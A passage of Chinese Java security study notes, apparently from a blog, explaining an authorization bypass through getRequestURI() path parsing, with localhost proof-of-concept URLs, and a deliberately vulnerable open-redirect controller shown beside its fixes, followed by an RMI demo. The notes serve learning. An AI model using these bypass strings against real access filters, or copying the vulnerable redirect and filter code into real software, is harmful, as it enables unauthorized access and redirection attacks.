org.slf4j.LoggerFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.AntPathMatcher;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.PathMatcher;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The difference between getRequestURI and getServletPath.</span></span><br><span class="line"><span class="comment"> * 由于Spring Security的&lt;code&gt;antMatchers("/css/**", "/js/**")&lt;/code&gt;未使用getRequestURI，所以登录不会被绕过。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * Details: https://joychou.org/web/security-of-getRequestURI.html</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * Poc:</span></span><br><span class="line"><span class="comment"> * http://localhost:8080/css/%2e%2e/exclued/vuln</span></span><br><span class="line"><span class="comment"> * http://localhost:8080/css/..;/exclued/vuln</span></span><br><span class="line"><span class="comment"> * http://localhost:8080/css/..;bypasswaf/exclued/vuln</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> JoyChou @2020-03-28</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"uri"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GetRequestURI</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Logger logger = LoggerFactory.getLogger(<span class="keyword">this</span>.getClass());</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span>(value = <span class="string">"/exclued/vuln"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">exclued</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        String[] excluedPath = &#123;<span class="string">"/css/**"</span>, <span class="string">"/js/**"</span>&#125;;</span><br><span class="line">        String uri = request.getRequestURI(); <span class="comment">// Security: request.getServletPath()</span></span><br><span class="line">        PathMatcher matcher = <span class="keyword">new</span> AntPathMatcher();</span><br><span class="line"></span><br><span class="line">        logger.info(<span class="string">"getRequestURI: "</span> + uri);</span><br><span class="line">        logger.info(<span class="string">"getServletPath: "</span> + request.getServletPath());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (String path : excluedPath) &#123;</span><br><span class="line">            <span class="keyword">if</span> (matcher.match(path, uri)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"You have bypassed the login page."</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"This is a login page &gt;..&lt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>geteRequestURI实际上是HttpServletRequest中几个解析URL的函数中的一种。它会返回除去Host（域名或IP）部分的路径。这里我们本地来起个项目跑一下。<br>按照Mi1k7ea博客中的jsp替换index.jsp  (<a href="https://xz.aliyun.com/t/7544" target="_blank" rel="noopener">https://xz.aliyun.com/t/7544</a>)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">  out.println(<span class="string">"getRequestURL(): "</span> + request.getRequestURL() + <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">  out.println(<span class="string">"getRequestURI(): "</span> + request.getRequestURI() + <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">  out.println(<span class="string">"getContextPath(): "</span> + request.getContextPath() + <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">  out.println(<span class="string">"getServletPath(): "</span> + request.getServletPath() + <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">  out.println(<span class="string">"getPathInfo(): "</span> + request.getPathInfo() + <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>起一个tomcat的话,要在Run=&gt;EditConfiguration 左边+号添加一个local tomcat server。并将项目路径配置好。我这里配置的根目录是java_sec_web.</p><p>接着来实验。一下几种形式的访问都可以访问到index.jsp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_web&#x2F;index.jsp</span><br><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_web&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;index.jsp</span><br><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_web&#x2F;totally_not_matter&#x2F;..&#x2F;index.jsp</span><br></pre></td></tr></table></figure><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/14.PNG" alt></p><p>特别的,使用<code>;a/;bb/;ccc/index.jsp</code>也可以访问到。</p><p>从这里我们就能发现。使用getRequestURI似乎就是直接返回我们请求路径host后面的部分。实际上底层源码也确实是这么写的。既然如此就可以导致某些利用urlbypass的攻击。</p><p>比如说,<code>/java_sec_web/info</code>路径下存在一个secret.jsp它通过如下代码来限制没有权限的人访问</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> HttpServletRequest httpServletRequest = (HttpServletRequest)servletRequest;</span><br><span class="line">HttpServletResponse httpServletResponse =(HttpServletResponse)servletResponse;</span><br><span class="line">String url = httpServletRequest.getRequestURI();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (url.startsWith(<span class="string">"/urltest/info"</span>)) &#123;</span><br><span class="line">    httpServletResponse.getWriter().write(<span class="string">"No Permission."</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是如下路径则可以轻松bypass</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_web&#x2F;.&#x2F;info&#x2F;secret.jsp</span><br><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_web&#x2F;;233333&#x2F;info&#x2F;secret.jsp</span><br><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_web&#x2F;32112323&#x2F;..&#x2F;info&#x2F;secret.jsp</span><br></pre></td></tr></table></figure><p>回到项目上来。我们就可以用同样的道理进行权限绕过了。这里给出的path是css与js这样的静态目录。<code>String[] excluedPath = {&quot;/css/**&quot;, &quot;/js/**&quot;};</code>我们同样可以通过几种方式访问。</p><p>所以安全的解决方案通常是使用<code>getPathInfo()</code>或者<code>getServletPath()</code>来替换<code>getRequestURI()</code></p><p>今年的一个shiroCVE就是这个成因。因为拦截器写的时候拦截了<code>/abc/*</code>这样的正则。而使用<code>/abc/1/</code>时，shiro的拦截器没有拦截到。但是getRequestURI却让我们正常访问到了。导致了权限绕过。</p><ul><li>url解析</li></ul><p>跟学习ssrf时里面出现的bypass url host限制是一个类型。因为有现成的解释就不多作说明了<a href="https://github.com/JoyChou93/java-sec-code/wiki/URL-whtielist-Bypass" target="_blank" rel="noopener">https://github.com/JoyChou93/java-sec-code/wiki/URL-whtielist-Bypass</a></p><p>基本上还是通过<code>#</code>,<code>;</code>等等来进行urlbypass绕过gethost。</p><ul><li>302调转</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.joychou.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.RequestDispatcher;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.joychou.security.SecurityUtil;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The vulnerability code and security code of Java url redirect.</span></span><br><span class="line"><span class="comment"> * The security code is checking whitelist of url redirect.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> JoyChou (joychou@joychou.org)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> 2017.12.28</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/urlRedirect"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLRedirect</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * http://localhost:8080/urlRedirect/redirect?url=http://www.baidu.com</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/redirect"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">redirect</span><span class="params">(@RequestParam(<span class="string">"url"</span>)</span> String url) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"redirect:"</span> + url;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * http://localhost:8080/urlRedirect/setHeader?url=http://www.baidu.com</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/setHeader"</span>)</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setHeader</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> </span>&#123;</span><br><span class="line">        String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">        response.setStatus(HttpServletResponse.SC_MOVED_PERMANENTLY); <span class="comment">// 301 redirect</span></span><br><span class="line">        response.setHeader(<span class="string">"Location"</span>, url);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * http://localhost:8080/urlRedirect/sendRedirect?url=http://www.baidu.com</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/sendRedirect"</span>)</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sendRedirect</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">        response.sendRedirect(url); <span class="comment">// 302 redirect</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Safe code. Because it can only jump according to the path, it cannot jump according to other urls.</span></span><br><span class="line"><span class="comment">     * http://localhost:8080/urlRedirect/forward?url=/urlRedirect/test</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/forward"</span>)</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">forward</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> </span>&#123;</span><br><span class="line">        String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">        RequestDispatcher rd = request.getRequestDispatcher(url);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            rd.forward(request, response);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Safe code of sendRedirect.</span></span><br><span class="line"><span class="comment">     * http://localhost:8080/urlRedirect/sendRedirect/sec?url=http://www.baidu.com</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/sendRedirect/sec"</span>)</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sendRedirect_seccode</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">        <span class="keyword">if</span> (SecurityUtil.checkURL(url) == <span class="keyword">null</span>) &#123;</span><br><span class="line">            response.setStatus(HttpServletResponse.SC_FORBIDDEN);</span><br><span class="line">            response.getWriter().write(<span class="string">"url forbidden"</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        response.sendRedirect(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一部分更多是安全编程的问题。如果重定向出现问题就很有可能会与xss等漏洞联系起来。此处恶意代码中,任意url都可以通过<code>setHeader</code>,<code>sendRedirect</code>导致重定向。限制方法则如最后两个解决措施,限制只能在path间调转或者直接写好<code>SecurityUtil</code>来限制调转的url.</p><h3 id="java-rmi"><a href="#java-rmi" class="headerlink" title="java-rmi"></a>java-rmi</h3><p>  最早接触到rmi是在复现vulhub上fastjson漏洞时学到的,使用jndi注入时用到<code>rmi://</code>或<code>jndi://</code>。现在来学习下rmi的具体使用，</p><blockquote><p>RMI（Remote Method Invocation）即远程方法调用，是分布式编程中的一个基本思想。<br> Java RMI是专为Java环境设计的远程方法调用机制，是一种用于实现远程调用（RPC，Remote Procedure Call）的Java API，能直接传输序列化后的Java对象和分布式垃圾收集。它的实现依赖于JVM，因此它支持从一个JVM到另一个JVM的调用。<br>在Java RMI中，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法，其中对象是通过序列化方式进行编码传输的。</p></blockquote><ul><li>design-pattern</li></ul><p>设计模式包含三个部分：<br>1.Registry。Server端向Registry注册服务,Client端从Registry获取远程对象的一些信息并进行调用。<br>2.Server 提供远程方法<br>3.Client 使用远程方法</p><ul><li>interaction</li></ul><blockquote><p>1.首先，启动RMI Registry服务，启动时可以指定服务监听的端口，也可以使用默认的端口（1099）<br>2.其次，Server端在本地先实例化一个提供服务的实现类，然后通过RMI提供的Naming/Context/Registry等类的bind或rebind方法将刚才实例化好的实现类注册到RMI Registry上并对外暴露一个名称<br>3.最后，Client端通过本地的接口和一个已知的名称（即RMI Registry暴露出的名称），使用RMI提供的Naming/Context/Registry等类的lookup方法从RMI Service那拿到实现类。这样虽然本地没有这个类的实现类，但所有的方法都在接口里了，便可以实现远程调用对象的方法</p></blockquote><ul><li>dynamic class loading</li></ul><p>一个非常重要的点。rmi支持我们在没有某个类定义时前去下载远程类。这也是jndi与反序列化应用的主要手段。动态加载的对象class文件可以使用Web服务的方式进行托管。这可以动态的扩展远程应用的功能，RMI注册表上可以动态的加载绑定多个RMI应用。客户端使用了与RMI注册表相同的机制。RMI服务端将URL传递给客户端，客户端通过HTTP请求下载这些类。同样实现了动态加载。</p><ul><li>coding</li></ul><p>下面来写个demo。还是按照mi1k7ea师傅的实例写法写下。</p><p>服务端远程调用的类Identity</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Identity</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为顾及到开发习惯,所以成员变量都是私有的。自然调用时也要有对应的setter,getter方法。idea支持直接alt+enter添加选中属性的setter和getter方法。</p><p>然后是一个远程接口，ServiceImpl.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Service</span> <span class="keyword">extends</span> <span class="title">Remote</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Identity&gt; <span class="title">GetList</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>远程接口必须继承java.rmi.Remote接口，且抛出RemoteException错误<br>然后是接口的实现类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServiceImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">Service</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ServiceImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Identity&gt; <span class="title">GetList</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Get Identity Start!"</span>);</span><br><span class="line">        List&lt;Identity&gt; personlist =<span class="keyword">new</span> LinkedList&lt;Identity&gt;();</span><br><span class="line"></span><br><span class="line">        Identity person1 = <span class="keyword">new</span> Identity();</span><br><span class="line">        person1.setId(<span class="number">0</span>);</span><br><span class="line">        person1.setName(<span class="string">"byc"</span>);</span><br><span class="line">        person1.setAge(<span class="number">20</span>);</span><br><span class="line">        personlist.add(person1);</span><br><span class="line"></span><br><span class="line">        Identity person2 = <span class="keyword">new</span> Identity();</span><br><span class="line">        person2.setId(<span class="number">1</span>);</span><br><span class="line">        person2.setName(<span class="string">"Joe"</span>);</span><br><span class="line">        person2.setAge(<span class="number">18</span>);</span><br><span class="line">        personlist.add(person2);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> personlist;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意这里构造方法也要throw  RemoteException.然后类建完后开始会报错说我们没有实现GetList()方法。这里直接点到报错的位置,它会自动提供我们一个重写的GetList()方法</p><p>下面是一个把Server和Registry的创建、对象绑定注册表写到一块的Program代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Program</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Service personService =<span class="keyword">new</span> ServiceImpl();</span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">6666</span>);</span><br><span class="line">            Naming.rebind(<span class="string">"rmi://127.0.0.1:6666/PersonService"</span>, personService);</span><br><span class="line">            System.out.println(<span class="string">"Service Start!"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端通过Naming.lookup()来查找RMI Server端的远程对象并获取到本地客户端环境中输出出来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Service personService =(Service) Naming.lookup(<span class="string">"rmi://127.0.0.1:6666/PersonService"</span>);</span><br><span class="line">            List&lt;Identity&gt; personList=personService.GetList();</span><br><span class="line">            <span class="keyword">for</span>(Identity person:personList)&#123;</span><br><span class="line">                System.out.println(<span class="string">"ID:"</span>+person.getId()+<span class="string">" Age:"</span>+person.getAge()+<span class="string">" Name:"</span>+person.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ex)&#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样是使用ctrl+alt+t添加try catch语句环绕中间rmi部分语句。<br>先启动rmiserver.然后客户端调用方法。<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/16.PNG" alt><br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/17.PNG" alt></p><p>几个函数的使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bind(String name, Object obj)：注册对象，把对象和一个名字name绑定</span><br><span class="line"></span><br><span class="line">rebind(String 